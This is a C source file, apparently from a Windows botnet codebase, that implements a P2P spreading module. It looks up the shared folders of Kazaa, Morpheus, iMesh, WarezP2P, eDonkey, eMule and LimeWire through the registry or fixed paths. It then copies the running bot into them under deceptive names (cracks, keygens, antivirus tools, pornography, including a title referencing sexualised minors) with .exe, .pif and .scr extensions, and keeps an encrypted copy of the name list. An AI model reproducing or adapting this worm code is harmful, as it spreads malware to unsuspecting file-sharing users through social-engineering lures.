#include "../header/includes.h"
#include "../header/functions.h"
#include "../header/externs.h"

#ifndef NO_P2P

void KazaaInit(char *botfile, char *destexe) 
{
	char buffer[MAX_PATH];

	HKEY hkey;
	DWORD dwSize = 128;

	fRegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\KAZAA\\LocalContent", 0, KEY_READ, &hkey);
	if(fRegQueryValueEx(hkey, "Dir0", NULL, NULL, (unsigned char*)buffer, &dwSize) == ERROR_SUCCESS) {
		replacestr(buffer, "012345:", "");
		strcat(buffer, destexe);
		CopyFile(botfile, buffer, FALSE);
	}
	fRegCloseKey(hkey);

	return;
}

void MorpheusInit(char *botfile, char *destexe) 
{
	char buffer[MAX_PATH];

	HKEY hkey;
	DWORD dwSize = 128;

	fRegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Morpheus", 0, KEY_READ, &hkey);
	if(fRegQueryValueEx(hkey, "Install_Dir", NULL, NULL, (unsigned char*)buffer, &dwSize) == ERROR_SUCCESS) {
		_snprintf(buffer, sizeof(buffer), "%s\\My Shared Folder", buffer);
		CreateDirectory(buffer, 0);
		strcat(buffer, destexe);
		CopyFile(botfile, buffer, FALSE);
	}
	fRegCloseKey(hkey);

	return;
}

void iMeshInit(char *botfile, char *destexe) 
{
	char buffer[MAX_PATH];

	HKEY hkey = NULL;
	DWORD dwSize = 128;

	fRegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\iMesh\\Client", 0, KEY_READ, &hkey);
	if(fRegQueryValueEx(hkey, "DownloadsLocation", NULL, NULL, (unsigned char*)buffer, &dwSize) == ERROR_SUCCESS) {
		strcat(buffer, destexe);
		CopyFile(botfile, buffer, FALSE);
	}
	fRegCloseKey(hkey);

	return;
}

void eDonkey2KInit(char *botfile, char *destexe) 
{
	char buffer[MAX_PATH];

	_snprintf(buffer, sizeof(buffer), "\\Program Files\\eDonkey2000\\incoming");
	CreateDirectory(buffer, 0);
	strcat(buffer, destexe);
	CopyFile(botfile, buffer, FALSE);

	return;
}

void eMuleKInit(char *botfile, char *destexe) // who uses the old eDonley ? so i added emule
{
	char buffer[MAX_PATH];

	_snprintf(buffer, sizeof(buffer), "\\Program Files\\eMule\\incoming");
	CreateDirectory(buffer, 0);
	strcat(buffer, destexe);
	CopyFile(botfile, buffer, FALSE);

	return;
}

void LimeWireInit(char *botfile, char *destexe) 
{
	char buffer[MAX_PATH];

	_snprintf(buffer, sizeof(buffer), "\\Program Files\\LimeWire\\Shared");
	CreateDirectory(buffer, 0);
	strcat(buffer, destexe);
	CopyFile(botfile, buffer, FALSE);

	return;
}

void WarezP2PInit(char *botfile, char *destexe) 
{
	char buffer[MAX_PATH], dir[MAX_PATH];
	HKEY hkey;
	DWORD dwSize = 128;

	fRegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\WarezP2P", 0, KEY_READ, &hkey);
	if(fRegQueryValueEx(hkey, "wp", NULL, NULL, (unsigned char*)dir, &dwSize) == ERROR_SUCCESS) {
		_snprintf(buffer, sizeof(buffer), "%s\\My Shared Folder", dir);
		CreateDirectory(buffer, 0);
		strcat(buffer, destexe);
		CopyFile(botfile, buffer, FALSE);
		/*_snprintf(buffer, sizeof(buffer), "%s\\Data\\Shared Folders.txt", dir);
		if (FileExists(buffer)) {
			FILE *fp;
			if ((fp == fopen(buffer, "r")) == 0) return;
			while (!feof(fp)) {
				fgets(buffer, MAX_PATH, fp);
				CreateDirectory(buffer, 0);
				strcat(buffer, destexe);
				CopyFile(botfile, buffer, FALSE);
			}
			fclose(fp);
		}*/
	} 
}

void P2PSpread(void) 
{
	char botfile[MAX_PATH], copyfile[MAX_PATH];
	#ifndef NO_CRYPT
	char *copyfiles[]= {
		"\x53\x45\x94\x45\x16\x92\xF7\x64\xB3\x3B\x5E\xC4\x4B\x73\x8E",
		"\x6D\x6F\xAB\x04\x49\xD2\xE7\x64\xFC\x2C\x10\xCF\x59\x25",
		"\x6A\x43\x88\x50\x14\x8C\xF7\x04\xED\x68\x1F\xDE\x4B",
		"\x69\x45\x99\x56\x14\x91\xB8\x37\xE9\x2C\x31\xCC\x48\x6D\xCC\xAD\x9F\xDD\x36\x97\x9E\xFE\xCF\x35\xAC\x36\xB0\xDD\xD8\x46\x7E\xEE\x9D\xB6\xDA\xBB\xD2",
		"\x69\x45\x99\x56\x14\x91\xB8\x37\xE9\x2C\x29\xC3\x40\x60\xC0\xBF\xCC\xCF\x5E\xF7\x81\xFE\xDB\x2E\xA3\x0D\x8B\xD1\xBB\x63\x70\xFF\x9D\xF3\x94\xAB\x9C\xEA\x98\xBF\x1E\xAE\xEE\x7A\x51\xB1\x0D\xE3\x93",
		"\x69\x45\x99\x56\x14\x91\xB8\x37\xE9\x2C\x31\xCC\x48\x6D\xCC\xAD\x9F\xB7\x56\x87\xDA\xB1\xFE\x2C\xA4\x3B\xBC\xD1\xBB\x63\x70\xFF\x9D\xF3\x94\x97\x96\xE1\x94\xB3\x1E",
		"\x74\x43\x88\x4A\x14\xCE\xF7\x22\xF8\x74\x52\x8A\x41\x76\xCE\xA4\x93\xCF\x67\xC9\xCC\xB2\xAC\x24\xA2\x3A\xB7\xDD\xD8\x70\x66\xF9\x85\xB0\xD9\xB9\xD2\xB9",
		"\x74\x43\x88\x4A\x14\xC2\x84\x32\xEF\x69\x1B\xC4\x5D\x65\xD9\xAD\xCD",
		"\x73\x45\x94\x40\x14\x95\xA4\x71\xCE\x69\x0C\xC3\x4F\x68\x8F\x83\xDA\x96\x61\xC2\xC3\xF0\xF8\x3F\xB9",
		"\x6F\x6D\xAC\x04\x4E\xCC\xE7",
		"\x6F\x4D\x89\x54\x1E\x90\xA4\x3A\xE4\x2C\x3F\xC4\x5A\x6D\xD9\xA1\xCD\x9A\x75\x87\x98\xF0\xBC",
		"\x74\x43\x88\x4A\x14\xC2\xA7\x38\xFE\x7F\x5E\xCB\x5C\x6C\xC6\xBE\xDA\xC3\x26\xDF\xD5\xA6\xA2\x3D\xA4\x25",
		"\x73\x45\x94\x40\x14\x95\xA4\x71\xCE\x63\x0B\xD8\x4D\x61\xCC\xA7\xDB\x8A\x26\xD2\xDD\xBA\xED\x33\xA8\x7B\xBF\x9E\x9B",
		"\x65\x44\x9F\x45\x1F\xC2\x99\x34\xEF\x63\x5E\x9D",
		"\x73\x45\x94\x40\x14\x95\xB9\x71\xD1\x63\x10\xCD\x46\x6B\xDD\xA6\x9F\xAD\x63\xD3\xCC\xFE\xC0\x22\xAC\x3E",
		"\x6B\x5C\x9F\x56\x1A\xC2\xEF\x71\xD3\x69\x09\x8B",
		"\x7C\x74\xA2\x04\x13\x83\xA5\x35\xFE\x63\x0C\xCF\x0E\x6D\xC2\xA9\xD8\x8A\x75",
		"\x73\x45\x94\x65\x16\x92\xF7\x67\xBD\x42\x1B\xDD\x0F",
		"\x73\x45\x94\x65\x16\x92\xF7\x64\xBD\x5C\x0C\xC5\x0E\x4F\xCA\xB1\xD8\x8A\x68\x87\xEE\xAC\xED\x24\xA6\x75\x8E\x81\x9C\x70\x65\xF9",
		"\x65\x48\x95\x46\x1E\xC2\x87\x39\xF2\x78\x11\xD9\x46\x6B\xDF\xE8\x86\xCF\x60\xD2\xC1\xB2",
		"\x69\x4D\x8E\x56\x12\x9A\xF7\x62\xBD\x5E\x1B\xDC\x41\x68\xDA\xBC\xD6\x80\x68\x87\xE8\xB0\xEB\x2B\xA4\x26\xB3\xD1\xAB\x64\x73\xE8\x9F\xAB\xD8\xB9\x80",
		"\x72\x45\x88\x51\x08\xC2\x94\x23\xF8\x6D\x0A\xCF\x5C",
		"\x6A\x43\x88\x50\x14\x8C\xF7\x12\xEF\x6D\x1D\xC1",
		"\x69\x4F\xBB\x42\x1E\x87\xF7\x1A\xF8\x75\x19\xCF\x40",
		"\x65\x7A\xBD\x04\x2D\x8B\xA5\x24\xEE\x2C\x1D\xC6\x4B\x65\xC1\xAD\xCD\xCF\x70\x90",
		"\x65\x6F\xBE\x77\x1E\x87\xF7\x68",
		"\x69\x7F\xCA\x10\x56\xD2\xE6\x60\xBD\x45\x13\xC7\x5B\x6A\xC6\xB2\xDA\x9D",
		"\x73\x45\x94\x7C\x2B\xC2\x9F\x30\xFE\x67",
		"\x73\x45\x94\x40\x14\x95\xA4\x7C\xD6\x4E\x46\x99\x1B\x33\x9C\xFA\x92\x97\x3E\x91\x80\x9B\xC2\x12",
		"\x6C\x4D\x99\x4F\x5B\x9B\xB8\x24\xEF\x2C\x18\xD8\x47\x61\xC1\xAC\xCC\xCF\x65\xC8\xC0\xAE\xF9\x33\xA8\x27"
	};
	char *copyexts[]={
		"\x0A\x49\x82\x41",
		"\x0A\x5C\x93\x42",
		"\x0A\x5F\x99\x56"
	};
	#else
	char *copyfiles[]= {
		"winamp 5.7 new!",
		"ICQ 2005a new!",
		"Norton Update",
		"Microsoft Windows Vista Xp Full + Crack",// following added :)
"1001 Sex and more.rtf",
"3D Studio Max 6 3dsmax",
"ACDSee 10",
"Adobe Photoshop 10 crack",
"Adobe Photoshop 10 full",
"Adobe Premiere 10",
"Ahead Nero 8",
"Altkins Diet.doc",
"American Idol.doc",
"Arnold Schwarzenegger.jpg",
"Best Matrix Screensaver new.scr",
"Britney sex xxx.jpg",
"Britney Spears and Eminem porn.jpg",
"Britney Spears blowjob.jpg",
"Britney Spears cumshot.jpg",
"Britney Spears fuck.jpg",
"Britney Spears full album.mp3",
"Britney Spears porn.jpg",
"Britney Spears Sexy archive.doc",
"Britney Spears Song text archive.doc",
"Britney Spears.jpg",
"Britney Spears.mp3",
"Clone DVD 6",
"Cloning.doc",
"Cracks & Warez Archiv",
"Dark Angels new",
"Dictionary English 2004 - France.doc",
"DivX 8.0 final",
"Doom 3 release 2",
"E-Book Archive2.rtf",
"Eminem blowjob.jpg",
"Eminem full album.mp3",
"Eminem Poster.jpg",
"Eminem sex xxx.jpg",
"Eminem Sexy archive.doc",
"Eminem Song text archive.doc",
"Eminem Spears porn.jpg",
"Eminem.mp3",
"Full album all.mp3",
"Gimp 1.8 Full with Key",
"Harry Potter 1-6 book.txt",
"Harry Potter 5.mpg",
"Harry Potter all e.book",
"Harry Potter e book.doc",
"Harry Potter game",
"Harry Potter.doc",
"How to hack new.doc",
"Internet Explorer 7 ( new and unreleased !!) Setup",
"Kazaa Lite 4.0 new",
"Kazaa new ( modded + 300% faster !) Works",
"Keygen 4 all new",
"Learn Programming 2004.doc",
"Lightwave 9 Update",
"Magix Video Deluxe 5 beta",
"Matrix.mpg",
"Microsoft Office 2003 Crack best",
"Microsoft WinXP Crack full",
"MS Service Pack 6",
"netsky source code",
"Norton Antivirus 2005 beta",
"Opera 11",
"Partitionsmagic 10 beta",
"Porno Screensaver britney",
"RFC compilation.doc",
"Ringtones.doc",
"Ringtones.mp3",
"Saddam Hussein (naked ;).jpg",
"Screensaver2",
"Serials edition.txt",
"Smashing the stack full.rtf",
"Star Office 9",
"Teen Porn 15.jpg",
"The Sims 4 beta",
"Ulead Keygen 2004",
"Visual Studio Net Crack all",
"Win Longhorn Prerelease",
"WinAmp 13 full",
"Windows 2000 Sourcecode.doc",
"Windows 2003 crack",
"Windows XP crack",
"WinXP eBook newest.doc",
"XXX hardcore pics.jpg",
		"Microsoft Office 2003 Crack, Working!",
		"Microsoft Windows XP, WinXP Crack, working Keygen",
		"Microsoft Office XP working Crack, Keygen",
		"Porno, sex, oral, anal cool, awesome!!",
		"Porno Screensaver.scr",
		"Windows Serial Keygen.txt",
		"KAV 5.0",
		"Battlefield 2 ( 2CD , with NoCdCrack",
		"Nero 7.0.0 Crack ( all languages + SERIAL",
		"Kaspersky Antivirus 5.0",
		"Porno pics arhive, xxx.zip",
		"Windows Sourcecode update.doc",
		"Ahead Nero 7",
		"Windown Longhorn Beta Leak",
		"Opera 8 New!",
		"XXX hardcore images",
		"WinAmp 6 New!",
		"WinAmp 5 Pro Keygen Crack Update",
		"Adobe Photoshop 9 full",
		"Matrix 3 Revolution English Subtitles",
		"Virus Creater",
		"Norton Crack",
		"McAfee Keygen",
		"AVG Virus cleaner v7",
		"ACDSee 9",
		"MS04-011 Immunizer",
		"WinXP Hack",
		"Windows-KB835732-x86-ENU",
		"Hack your friends computer"
	};
	char *copyexts[] = {
		".exe",
		".pif",
		".scr"
	};
	#endif
	int copyfilesize=sizeof(copyfiles)/sizeof(LPTSTR);
	int copyextsize=sizeof(copyexts)/sizeof(LPTSTR);

	#ifndef NO_CRYPT
	char buffer[512];
	int i;
	for (i=0;i<copyfilesize;i++) {
		_snprintf(buffer, sizeof(buffer), copyfiles[i]);
		Crypt((unsigned char *)buffer, strlen(buffer),NULL,0);
		copyfiles[i]=buffer;
	}
	for (i=0;i<copyextsize;i++) {
		_snprintf(buffer, sizeof(buffer), copyfiles[i]);
		Crypt((unsigned char *)buffer, strlen(buffer),NULL,0);
		copyexts[i]=buffer;
	}
	#endif
	GetModuleFileName(NULL, botfile, sizeof(botfile));

	_snprintf(copyfile, sizeof(copyfile), "%s%s", copyfiles[randnum(copyfilesize)], copyexts[randnum(copyextsize)]);
	KazaaInit(botfile,copyfile);

	_snprintf(copyfile, sizeof(copyfile), "%s%s", copyfiles[randnum(copyfilesize)], copyexts[randnum(copyextsize)]);
	MorpheusInit(botfile,copyfile);

	_snprintf(copyfile, sizeof(copyfile), "%s%s", copyfiles[randnum(copyfilesize)], copyexts[randnum(copyextsize)]);
	eDonkey2KInit(botfile,copyfile);

	_snprintf(copyfile, sizeof(copyfile), "%s%s", copyfiles[randnum(copyfilesize)], copyexts[randnum(copyextsize)]);
	LimeWireInit(botfile,copyfile);

	_snprintf(copyfile, sizeof(copyfile), "%s%s", copyfiles[randnum(copyfilesize)], copyexts[randnum(copyextsize)]);
	iMeshInit(botfile,copyfile);

	_snprintf(copyfile, sizeof(copyfile), "%s%s", copyfiles[randnum(copyfilesize)], copyexts[randnum(copyextsize)]);
	WarezP2PInit(botfile,copyfile);
	
	_snprintf(copyfile, sizeof(copyfile), "%s%s", copyfiles[randnum(copyfilesize)], copyexts[randnum(copyextsize)]); //added by look in the config :) 
	eMuleKInit(botfile,copyfile);


	return;
}
#endif